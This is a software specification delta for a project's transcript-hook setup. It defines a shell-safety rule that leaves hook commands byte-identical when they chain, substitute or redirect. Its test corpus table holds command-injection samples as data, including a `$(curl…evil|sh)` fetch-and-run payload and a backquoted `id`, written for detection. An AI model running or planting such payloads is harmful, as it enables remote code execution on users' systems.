---
id: "0247"
slug: mempalace-transcript-hook-typescript
status: draft
complexity: standard
interaction-mode: MINIMAL
related-issue: 1329
version: 2.0.0
---

# MemPalace transcript hook in TypeScript

*Delta 03 of `specs/0247-mempalace-transcript-hook-typescript.md`, cumulative
over delta-01 and delta-02. Source: ticket #1329, seat finding `i1-F5`
(`class: spec`) of `review/1329` on PR #1486
(<https://github.com/crewrig/crewrig/pull/1486#issuecomment-6034183319>). The
security hardening S1 of the implementation PR (PR B) added a shell-safety
test to both twins of the transcript predicate: `isShellSafe` in
`scripts/lib/transcript-recognition.ts` (`:74-93`, applied at `:97`) and
`sr_tr_safe` in `scripts/lib/usage-capture-optin.sh` (`:224-234`), both at
`fb2668be` on `feat/1329-mempalace-transcript-typescript`. A command that
requirement 24's grammar recognises but that fails the test was classed `no`.
The approved text classed it by its prefix names instead, so S1 narrowed
requirement 24 without normative text. The narrowing also broke requirement
26. On the enable path, `sr_event_has_transcript` (`:311` at `fb2668be`)
counts only commands that are not `no` (`sr_is_transcript_any`, `:280`).
Setup therefore added the direct form beside such a command, and the event
recorded twice. The corpus row
`MEMPALACE_TRANSCRIPT_ENABLED="1" bash /x/mempalace-transcript.sh` (`:163` of
`scripts/tests/fixtures/mempalace-transcript/recognition-corpus.json` at
`fb2668be`) pins that case. The owner decided on 2026-10-07 that such a command
is `foreign-prefix`: left byte-identical, reported, and nothing added to its
event, on every path and on all four CLIs, with the qualification of
requirement 23(c) for Antigravity CLI's named hook. Asked the same day about
the forms S1 rejects because they chain or substitute, the owner chose the
same class for every command that fails the test, with no separate `no` group.
Commit `5f526595` on PR B's branch keeps a `chained` group classed `no`, so
PR B has to move that group to `foreign-prefix` to conform to this delta.*

*This delta records the shell-safety rule in requirement 24, the reporting in
requirement 25, the "never two" rule for this class in requirement 26, and the
tests in requirement 32. It changes no behaviour of the hook. It runs under the
release-branch regime of
`specs/0215-shell-to-typescript-migration.delta-04.md`, and its spec-PR
targets `release/1231-ts-migration`. Spec 0215 and its deltas 01 to 04 say
nothing about the classes of requirement 24, so this delta contradicts none of
them. The version is a MAJOR bump. Commands the approved text classed
`legacy-enabled` or `legacy-unmarked`, and so rewrote or removed, are now left
byte-identical. PR B's twins and corpus must change. No question is left
open.*

## ADDED

**Scenario:** A transcript command carrying shell syntax blocks the add on every CLI

Given, on one event of each of the four CLIs' user-level configurations, the
command `MEMPALACE_TRANSCRIPT_ENABLED="1" bash /x/hooks/mempalace-transcript.sh`.
On Antigravity CLI, this command sits in that event's array inside the
`crewrig-mempalace-transcript` named hook, beside an own `legacy-enabled`
command.
When setup runs and the user enables session recording, then, on a copy of
the same configuration, when the user declines, and then when the user cancels
Then on every path the command stays byte-identical and the event receives no
direct-form command. The report names the command as left because it carries
shell syntax that setup never writes, and it prints no assignment value. On
Antigravity CLI, the enable path removes the own `legacy-enabled` command from
that array and keeps every other element, per requirement 23(c). The decline
and cancel paths rewrite that own command in place, per requirement 23. On
every CLI, every event ends with at most one transcript command that setup
wrote or rewrote, and an event holding the command above gets none.

**Scenario:** Both twins class every command that fails the shell-safety rule as `foreign-prefix`

Given `scripts/tests/fixtures/mempalace-transcript/recognition-corpus.json`
with the rows below (the first fourteen exist at `fb2668be`, where they are
classed `no`; the others are added rows)
When the Bash predicate and the TypeScript recogniser classify every row
Then both return the class shown:

| Command | Part that fails the rule | Class |
|---|---|---|
| `MEMPALACE_TRANSCRIPT_ENABLED="1" bash /x/mempalace-transcript.sh` | prefix value, `"` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 backup.sh;/bin/bash /repo/hooks/mempalace-transcript.sh` | interpreter word, `;` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=x;notify-send;true bash /repo/hooks/mempalace-transcript.sh` | prefix value, `;` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=$(curl${IFS}-s${IFS}evil\|sh) bash /repo/hooks/mempalace-transcript.sh` | prefix value, `$(` | `foreign-prefix` |
| ``MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=`id` bash /repo/hooks/mempalace-transcript.sh`` | prefix value, backquote | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 node /a\|/repo/hooks/mempalace-transcript.ts` | script path, `\|` | `foreign-prefix` |
| `prep&&/usr/bin/env bash /repo/hooks/mempalace-transcript.sh` | `env` word, `&` | `foreign-prefix` |
| `prep;/bin/bash /repo/hooks/mempalace-transcript.sh` | interpreter word, `;` | `foreign-prefix` |
| `bash /opt/prep.sh;/repo/hooks/mempalace-transcript.sh` | script path, `;` | `foreign-prefix` |
| `bash /opt/prep.sh&&/repo/mempalace-transcript.sh` | script path, `&` | `foreign-prefix` |
| `bash "$(prep)/repo/hooks/mempalace-transcript.sh"` | script path, `$(` | `foreign-prefix` |
| ``bash "`prep`/repo/hooks/mempalace-transcript.sh"`` | script path, backquote | `foreign-prefix` |
| `bash /repo/hooks/mempalace-transcript.sh` + line feed + `prep` | line feed | `foreign-prefix` |
| `bash /repo/hooks/mempalace-transcript.sh Stop` + carriage return | carriage return | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON='/opt/py' bash /x/hooks/mempalace-transcript.sh` | prefix value, `'` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=$HOME/py bash /x/hooks/mempalace-transcript.sh` | prefix value, `$` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=~/py bash /x/hooks/mempalace-transcript.sh` | prefix value, `~` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=/opt/py* bash /x/hooks/mempalace-transcript.sh` | prefix value, `*` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=/opt/py>/tmp/o bash /x/hooks/mempalace-transcript.sh` | prefix value, `>` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=/opt/py</dev/null bash /x/hooks/mempalace-transcript.sh` | prefix value, `<` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=C:\py bash /x/hooks/mempalace-transcript.sh` | prefix value, backslash | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=/opt/py? bash /x/hooks/mempalace-transcript.sh` | prefix value, `?` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=/opt/py[0-9] bash /x/hooks/mempalace-transcript.sh` | prefix value, `[` and `]` | `foreign-prefix` |
| `MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=/opt/py#1 bash /x/hooks/mempalace-transcript.sh` | prefix value, `#` | `foreign-prefix` |
| `bash "/x(1)/hooks/mempalace-transcript.sh"` | script path, `(` and `)` | `foreign-prefix` |
| `bash "/x<y/hooks/mempalace-transcript.sh"` | script path, `<` | `foreign-prefix` |
| `bash "/x>y/hooks/mempalace-transcript.sh"` | script path, `>` | `foreign-prefix` |
| `bash "/x\y/hooks/mempalace-transcript.sh"` | script path, backslash | `foreign-prefix` |
| `set NoDefaultCurrentDirectoryInExePath=1&& node C:/Users/ana/crewrig/hooks/mempalace-transcript.ts claude-code` + line feed | line feed, guarded form | `foreign-prefix` |
| `bash "$CLAUDE_PROJECT_DIR/hooks/mempalace-transcript.sh"` | none: a `$` not followed by `(` is allowed in the script path | `legacy-unmarked` |
| `set NoDefaultCurrentDirectoryInExePath=1&& node C:/Users/ana/crewrig/hooks/mempalace-transcript.ts claude-code` | none: the guarded prefix is exempt from the character test | `direct` |
| `bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh` | not recognised by the grammar | `no` |

In the table, `\|` stands for a single `|`, and "+ line feed" or "+ carriage
return" stands for that one character inside the command string.

**Out of scope:** A command that the grammar of requirement 24 does not
recognise is not a transcript command, and this delta does not change that. It
can still run the hook when a shell runs it. Two examples are a chain whose
operator stands as a separate word,
`bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh`, and a quoted
prefix value holding a space, `MEMPALACE_PYTHON="/a b/py" bash …`. On the
enable path such an event then receives the direct form beside it and records
twice. This behaviour has been approved since delta-01 (the scenario "A chained
operator command is never touched", and the last sentence of requirement 24).
It is not caused by S1, and it is not part of finding `i1-F5`. The owner was
told about it on 2026-10-07. Changing it needs its own ticket, because it widens
the grammar that C1's and C2's shared signature serves.

## MODIFIED

### Requirement 24 — the shell-safety rule and its class (seat finding i1-F5, owner decision of 2026-10-07)

The original below is requirement 24 as delta-01 replaced it.

Original:

<!-- markdownlint-disable-next-line MD029 -->
> 24. **Recognition by content (reworded at delta-01).** A registered command is
>     a transcript command when its whole shape matches. That shape is: an
>     optional prefix of `NAME=value` words, an optional `env`, an optional
>     `bash`, `sh` or `node`, and a script path ending in
>     `/mempalace-transcript.sh` or `/mempalace-transcript.ts`, quoted or not.
>     After the path comes an argument list in one of the four forms setup has
>     ever written, its words separated by whitespace and trailing whitespace
>     allowed: (i) no argument; (ii) exactly one word of ASCII letters that is
>     not a CLI identifier, the legacy Antigravity event; (iii) exactly one of
>     `claude-code`, `gemini-cli` or `copilot-cli`; (iv) `antigravity-cli`
>     followed by exactly one word of ASCII letters. For the Antigravity CLI
>     descriptor only, the guarded prefix of spec 0243 delta-03 requirement 34
>     may stand in place of that prefix. In the classes below, "shape (a) or
>     (b)" means forms (i) and (ii), and "shape (c)" means forms (iii) and (iv).
>     This recognition grammar is narrower than the runtime acceptance of
>     requirement 3, which stays as written. An empty first argument, further
>     arguments after a legacy event, and a CLI identifier followed by the
>     wrong number of arguments are shapes the hook accepts or ends when it
>     runs. They are never transcript commands, because a command that names a
>     script called `mempalace-transcript.*` with other arguments is not one
>     (last sentence of this requirement). Every transcript command SHALL fall
>     in exactly one class, decided from the command text alone:
>     (a) `foreign-prefix` — its prefix carries an assignment to a name other than
>     `MEMPALACE_TRANSCRIPT_ENABLED` and `MEMPALACE_PYTHON`, or it has the direct
>     shape (c) and carries any `NAME=value` prefix;
>     (b) `direct` — shape (c) with no prefix, or with the guarded prefix only;
>     (c) `legacy-enabled` — shape (a) or (b) whose prefix is made of
>     `MEMPALACE_TRANSCRIPT_ENABLED=1` and at most one
>     `MEMPALACE_PYTHON=<non-blank word>`. This is the prefix setup writes today
>     (`scripts/setup-gemini-interactive.sh:429-431`,
>     `scripts/setup-copilot-interactive.sh:419-421`,
>     `scripts/setup-antigravity-interactive.sh:459-461`);
>     (d) `legacy-unmarked` — shape (a) or (b) with no prefix, or with a prefix
>     made only of those two names in which `MEMPALACE_TRANSCRIPT_ENABLED` is
>     absent or not `1`. One transcript-only predicate SHALL exist in each twin:
>     a new Bash predicate in `scripts/lib/usage-capture-optin.sh` and the
>     TypeScript recogniser. Each SHALL return the class or "not a transcript
>     command", and the two SHALL return the same answer for every row of a new
>     corpus, `scripts/tests/fixtures/mempalace-transcript/recognition-corpus.json`.
>     Each row carries a `command`, a `transcript` field holding one of `no`,
>     `direct`, `legacy-enabled`, `legacy-unmarked` or `foreign-prefix`, and a
>     `note`. The corpus SHALL include, classed `no`, a row with the arguments
>     `--foo bar` and a row with the arguments `Stop extra`. Since C2,
>     `sr_is_own` (`scripts/lib/usage-capture-optin.sh:233`) reads
>     `sr_is_transcript or sr_is_guard` (`:211-218`, `:224-231`). It SHALL come
>     to mean "the transcript predicate returns `direct`, `legacy-enabled` or
>     `legacy-unmarked`, or the command is a worktree git guard command". That
>     change SHALL be made by re-expressing `sr_is_transcript` alone. The guard
>     half, `sr_is_guard`, keeps accepting and rejecting exactly what it
>     accepts and rejects today, so guard ownership and the guard refresh of
>     `sr_merge` are unchanged (requirement 29). The transcript half changes on
>     purpose. It now rejects a `foreign-prefix` command, which it accepted. It
>     now accepts the `node` and `.ts` forms and the legacy Antigravity event
>     argument, which it rejected. The existing corpus
>     `scripts/tests/fixtures/usage-capture/recognition-corpus.json`, its
>     `capture` field and its two consumers stay unchanged. A command that
>     chains an operator's own script, or names a script called
>     `mempalace-transcript.*` with other arguments, is not a transcript
>     command and SHALL never be rewritten, kept, deduplicated or removed,
>     except inside Antigravity CLI's `crewrig-mempalace-transcript` named
>     hook, which requirement 23(c) treats per event.

Replacement:

<!-- markdownlint-disable-next-line MD029 -->
> 24. **Recognition by content (reworded at delta-01, shell-safety rule added
>     at delta-03).** A registered command is a transcript command when its
>     whole shape matches. That shape is: an optional prefix of `NAME=value`
>     words, an optional `env`, an optional `bash`, `sh` or `node`, and a
>     script path ending in `/mempalace-transcript.sh` or
>     `/mempalace-transcript.ts`, quoted or not. In that prefix, a value, and
>     the directory part before `env` or before the interpreter, are any run of
>     non-whitespace characters. An unquoted script path is any run of
>     characters other than whitespace and quotes. A quoted one is any run of
>     characters other than its own quote. After the path comes an argument
>     list in one of the four forms setup has ever written, its words separated
>     by whitespace and trailing whitespace allowed: (i) no argument; (ii)
>     exactly one word of ASCII letters that is not a CLI identifier, the
>     legacy Antigravity event; (iii) exactly one of `claude-code`,
>     `gemini-cli` or `copilot-cli`; (iv) `antigravity-cli` followed by exactly
>     one word of ASCII letters. Throughout this grammar, whitespace includes
>     the line feed and the carriage return. For the Antigravity CLI descriptor
>     only, the guarded prefix of spec 0243 delta-03 requirement 34 may stand
>     in place of that prefix. In the classes below, "shape (a) or (b)" means
>     forms (i) and (ii), and "shape (c)" means forms (iii) and (iv). This
>     recognition grammar is narrower than the runtime acceptance of
>     requirement 3, which stays as written. An empty first argument, further
>     arguments after a legacy event, and a CLI identifier followed by the
>     wrong number of arguments are shapes the hook accepts or ends when it
>     runs. They are never transcript commands, because a command that names a
>     script called `mempalace-transcript.*` with other arguments is not one
>     (last sentence of this requirement).
>
>     **Shell-safety rule.** A transcript command passes this rule when all
>     three of the following hold, and fails it otherwise:
>     (1) none of its prefix, its script path and its arguments holds a line
>     feed (U+000A) or a carriage return (U+000D);
>     (2) unless it carries the guarded prefix, its script path, quotes
>     removed, holds none of `;`, `&`, `|`, `<`, `>`, `(`, `)`, the backquote
>     and the backslash, and not the two characters `$(` in sequence. A `$`
>     followed by anything else is allowed there, as in
>     `"$CLAUDE_PROJECT_DIR/hooks/mempalace-transcript.sh"`;
>     (3) unless it carries the guarded prefix, its whole prefix reads, in
>     order: optional spaces or horizontal tabs; zero or more words `NAME=value`,
>     each followed by one or more spaces or horizontal tabs, where `NAME` is
>     an ASCII letter or underscore followed by ASCII letters, digits or
>     underscores; an optional `env`, followed by one or more spaces or
>     horizontal tabs; and an optional `bash`, `sh` or `node`, followed by one
>     or more spaces or horizontal tabs. `env` and the interpreter may each be
>     preceded by a directory part ending in `/`. Every value and every
>     directory part SHALL consist only of safe characters. A safe character is
>     any character other than whitespace, `;`, `&`, `|`, `<`, `>`, `(`, `)`,
>     `$`, the backquote, the backslash, `"`, `'`, `*`, `?`, `[`, `]`, `{`,
>     `}`, `#` and `~`. A command carrying the guarded prefix is exempt from (2)
>     and (3). That prefix is a fixed string the framework writes, its `&&`
>     included. The path grammar of the guarded form, from spec 0243 delta-03
>     requirement 34, already excludes whitespace, quotes, the backslash, `&`,
>     `|`, `<`, `>`, `^`, `%`, parentheses, `$` and the backquote. The
>     arguments need no
>     character test beyond (1), because the grammar admits only ASCII letters
>     and whitespace there. This is the rule PR B implements as `isShellSafe`
>     and `sr_tr_safe` at `fb2668be`, with the same character sets.
>
>     Every transcript command SHALL fall in exactly one class, decided from
>     the command text alone, the shell-safety rule first:
>     (a) `foreign-prefix` — it fails the shell-safety rule, whatever its
>     argument form and whatever names its prefix assigns; or its prefix
>     carries an assignment to a name other than
>     `MEMPALACE_TRANSCRIPT_ENABLED` and `MEMPALACE_PYTHON`; or it has the
>     direct shape (c) and carries any `NAME=value` prefix;
>     (b) `direct` — shape (c) with no prefix, or with the guarded prefix only;
>     (c) `legacy-enabled` — shape (a) or (b) whose prefix is made of
>     `MEMPALACE_TRANSCRIPT_ENABLED=1` and at most one
>     `MEMPALACE_PYTHON=<non-blank word>`. This is the prefix setup writes today
>     (`scripts/setup-gemini-interactive.sh:429-431`,
>     `scripts/setup-copilot-interactive.sh:419-421`,
>     `scripts/setup-antigravity-interactive.sh:459-461`);
>     (d) `legacy-unmarked` — shape (a) or (b) with no prefix, or with a prefix
>     made only of those two names in which `MEMPALACE_TRANSCRIPT_ENABLED` is
>     absent or not `1`. Classes (b) to (d) apply only to a command that passes
>     the shell-safety rule. A command that fails it can chain, substitute or
>     redirect, and the shell may still run the hook. It belongs to the
>     operator: setup SHALL neither rewrite it nor remove it, because that
>     would drop the operator's syntax. Setup SHALL count it as a transcript
>     command on its event, because an added direct form would then record
>     the event twice. Class (a) gives both, with requirements 23, 25 and 26.
>     One transcript-only predicate SHALL exist in each twin:
>     a new Bash predicate in `scripts/lib/usage-capture-optin.sh` and the
>     TypeScript recogniser. Each SHALL return the class or "not a transcript
>     command", and the two SHALL return the same answer for every row of a new
>     corpus, `scripts/tests/fixtures/mempalace-transcript/recognition-corpus.json`.
>     Each row carries a `command`, a `transcript` field holding one of `no`,
>     `direct`, `legacy-enabled`, `legacy-unmarked` or `foreign-prefix`, and a
>     `note`. The corpus SHALL include, classed `no`, a row with the arguments
>     `--foo bar` and a row with the arguments `Stop extra`. It SHALL include
>     every row of the scenario "Both twins class every command that fails the
>     shell-safety rule as `foreign-prefix`" (delta-03), with the class shown
>     there. Taken together, those rows have, classed `foreign-prefix`: at
>     least one row for each character of the unsafe set of (3) other than
>     whitespace, carried in a prefix value or a directory part; at least one
>     row for each character of (2), and for `$(`, carried in the script path;
>     one row with a line feed and one with a carriage return; and one guarded
>     row with a line feed. Since C2,
>     `sr_is_own` (`scripts/lib/usage-capture-optin.sh:233`) reads
>     `sr_is_transcript or sr_is_guard` (`:211-218`, `:224-231`). It SHALL come
>     to mean "the transcript predicate returns `direct`, `legacy-enabled` or
>     `legacy-unmarked`, or the command is a worktree git guard command". That
>     change SHALL be made by re-expressing `sr_is_transcript` alone. The guard
>     half, `sr_is_guard`, keeps accepting and rejecting exactly what it
>     accepts and rejects today, so guard ownership and the guard refresh of
>     `sr_merge` are unchanged (requirement 29). The transcript half changes on
>     purpose. It now rejects a `foreign-prefix` command, which it accepted,
>     and that includes every command that fails the shell-safety rule. It
>     now accepts the `node` and `.ts` forms and the legacy Antigravity event
>     argument, which it rejected. The existing corpus
>     `scripts/tests/fixtures/usage-capture/recognition-corpus.json`, its
>     `capture` field and its two consumers stay unchanged. A command that
>     this grammar does not recognise is not a transcript command and SHALL
>     never be rewritten, kept, deduplicated or removed, except inside
>     Antigravity CLI's `crewrig-mempalace-transcript` named hook, which
>     requirement 23(c) treats per event. Examples are a command that chains
>     an operator's own script through a separate shell word, such as
>     `bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh`, and a
>     command that names a script called `mempalace-transcript.*` with other
>     arguments. A command that the grammar recognises but that fails the
>     shell-safety rule is a transcript command of class `foreign-prefix`,
>     even when it chains or substitutes.

### Requirement 25 — reporting a command left by the shell-safety rule (seat finding i1-F5)

Original:

<!-- markdownlint-disable-next-line MD029 -->
> 25. **Target and left commands.** Setup SHALL rewrite a recognised transcript
>     command to the `.ts` of the checkout running setup, whatever path the
>     command names, because the legacy paths name copies setup made from
>     whichever checkout ran it last (`scripts/lib/common.sh:2369`). On every
>     path — enable, decline or cancel — it SHALL leave a `foreign-prefix`
>     command byte-identical and report it with the assignment that made it so,
>     so that an operator's own setting is never dropped silently (as spec 0243
>     delta-01 does for capture commands); and on the enable path it SHALL add no
>     transcript command on an event that holds one, by the rule of
>     requirement 23. It SHALL leave the installed copies under the
>     CLIs' directories on disk and report their paths as no longer used.

Replacement:

<!-- markdownlint-disable-next-line MD029 -->
> 25. **Target and left commands (reworded at delta-03).** Setup SHALL rewrite
>     a recognised transcript command of an own class (`direct`,
>     `legacy-enabled`, `legacy-unmarked`) to the `.ts` of the checkout running
>     setup, whatever path the command names, because the legacy paths name
>     copies setup made from whichever checkout ran it last
>     (`scripts/lib/common.sh:2369`). On every path (enable, decline or
>     cancel), it SHALL leave a `foreign-prefix` command byte-identical and
>     report it, so that an operator's own setting is never dropped silently
>     (as spec 0243 delta-01 does for capture commands). The report SHALL give
>     the reason. For a command classed so by an assignment, the reason is that
>     assignment, named by its `NAME`. For a command classed so by the
>     shell-safety rule of requirement 24, the reason is that the command
>     carries shell syntax setup never writes, together with the part that
>     carries it: the prefix, the script path, or a line break. The report SHALL
>     print no assignment value in either case, because a value may be a
>     credential. On the enable path, setup SHALL add no transcript command on
>     an event that holds one, `foreign-prefix` commands of either kind
>     included, by the rule of requirement 23. It SHALL leave the installed
>     copies under the CLIs' directories on disk and report their paths as no
>     longer used.

### Requirement 26 — "never two" holds for a command left by the shell-safety rule (seat finding i1-F5)

The original below is requirement 26 as delta-01 replaced it.

Original:

<!-- markdownlint-disable-next-line MD029 -->
> 26. **Idempotence and write safety (reworded at delta-01).** A second run of
>     the rewrite setup makes before the session-recording question SHALL write
>     nothing and create no backup when it runs over a configuration that rewrite
>     has already rewritten. That rewrite is the in-place rewrite of
>     requirement 23, which setup runs on every run before the question,
>     whatever the answer, and on which the decline and cancel paths rely:
>     `direct`,
>     `legacy-enabled` and consented `legacy-unmarked` commands moved to the
>     direct form. The enable path keeps the unconditional backup and write it
>     has today, because requirement 29 lists the only changes made to that
>     path and this is not one of them. A second enable run SHALL instead leave
>     the configuration's content byte-identical to the result of the first.
>     No combination of the session-recording question and the usage-capture
>     question SHALL add a transcript command to an event that already holds
>     one, or leave two transcript commands on one event of one CLI that setup
>     wrote or rewrote. A configuration that already held two before setup ran
>     keeps no more than it held. Every write SHALL be backup-first and end at
>     mode 0600. It SHALL preserve every entry and key it does not own;
>     Antigravity CLI's `crewrig-mempalace-transcript` named hook is owned,
>     within the limits of requirement 23(c). It SHALL refuse a configuration
>     that is not a JSON object, leave the file byte-identical when it fails,
>     and put no configuration content on the argument list of any process
>     (spec 0243 requirement 23).

Replacement:

<!-- markdownlint-disable-next-line MD029 -->
> 26. **Idempotence and write safety (reworded at delta-01 and delta-03).** A
>     second run of
>     the rewrite setup makes before the session-recording question SHALL write
>     nothing and create no backup when it runs over a configuration that rewrite
>     has already rewritten. That rewrite is the in-place rewrite of
>     requirement 23, which setup runs on every run before the question,
>     whatever the answer, and on which the decline and cancel paths rely:
>     `direct`,
>     `legacy-enabled` and consented `legacy-unmarked` commands moved to the
>     direct form. The enable path keeps the unconditional backup and write it
>     has today, because requirement 29 lists the only changes made to that
>     path and this is not one of them. A second enable run SHALL instead leave
>     the configuration's content byte-identical to the result of the first.
>     No combination of the session-recording question and the usage-capture
>     question SHALL add a transcript command to an event that already holds
>     one, or leave two transcript commands on one event of one CLI that setup
>     wrote or rewrote. For this rule, a command classed `foreign-prefix`
>     because it fails the shell-safety rule of requirement 24 is a transcript
>     command its event already holds. In both twins, the test of whether an
>     event holds a transcript command SHALL therefore count every class other
>     than "not a transcript command". A configuration that already held two
>     before setup ran keeps no more than it held. Every write SHALL be
>     backup-first and end at
>     mode 0600. It SHALL preserve every entry and key it does not own;
>     Antigravity CLI's `crewrig-mempalace-transcript` named hook is owned,
>     within the limits of requirement 23(c). It SHALL refuse a configuration
>     that is not a JSON object, leave the file byte-identical when it fails,
>     and put no configuration content on the argument list of any process
>     (spec 0243 requirement 23).

### Requirement 32 — tests of the shell-safety class (seat finding i1-F5)

Only one sentence of requirement 32, as delta-02 left it, changes. Every
other sentence, including the paragraph on §5 of
`scripts/tests/test-setup-antigravity-transcript.sh`, stays as written.
Original sentence:

> They SHALL include, for each CLI, the decline path on every class of
> requirement 24 and the enable path on a `foreign-prefix` command, and, on
> Antigravity CLI, both paths on a command that names a script called
> `mempalace-transcript.*` with other arguments inside the
> `crewrig-mempalace-transcript` named hook.

Replacement sentence:

> They SHALL include, for each CLI, the decline path on every class of
> requirement 24, and the enable path on a `foreign-prefix` command classed so
> by an assignment and on one classed so by the shell-safety rule. The second
> SHALL assert that the command stays byte-identical, that its event receives
> no direct-form command, and that the report names the shell-syntax reason
> and prints no assignment value. On Antigravity CLI, they SHALL include both
> paths on a command that names a script called `mempalace-transcript.*` with
> other arguments inside the `crewrig-mempalace-transcript` named hook, and
> both paths on a command that fails the shell-safety rule inside that named
> hook, beside an own transcript command on the same event.

## REMOVED

Nothing is removed.
